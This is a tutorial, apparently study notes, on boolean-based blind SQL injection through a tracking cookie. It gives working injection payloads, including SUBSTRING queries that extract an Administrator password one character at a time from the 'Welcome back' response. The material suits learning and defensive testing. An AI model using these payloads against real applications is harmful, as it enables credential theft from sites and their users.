# Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. 
Requests to the application include a cookie header like this:
```bash
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
When a request containing a TrackingId cookie is processed, 
the application uses a SQL query to determine whether this is a known user:
```bash
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
This query is vulnerable to SQL injection, but the results from the query are not returned to the user. 
However, the application does behave differently depending on whether the query returns any data

To understand how this exploit works, suppose that two requests are sent containing the following 
TrackingId cookie values in turn:
```bash
…xyz' AND '1'='1
…xyz' AND '1'='2
```
1) The first of these values causes the query to return results, because the injected AND `'1'='1` condition is true.
As a result, the "Welcome back" message is displayed.<br>
2)The second value causes the query to not return any results, because the injected condition is false.
The "Welcome back" message is not displayed.

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`
You can determine the password for this user by sending a series of inputs to test the password one character at a time.
```bash
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
This returns the "Welcome back" message, indicating that the injected 
condition is true, and so the first character of the password is greater than m.
```bash
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
This does not return the "Welcome back" message, indicating that the injected
condition is false, and so the first character of the password is not greater than t.
```bash
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
"Welcome back" message appeared and it is confirm first character of password is `s`






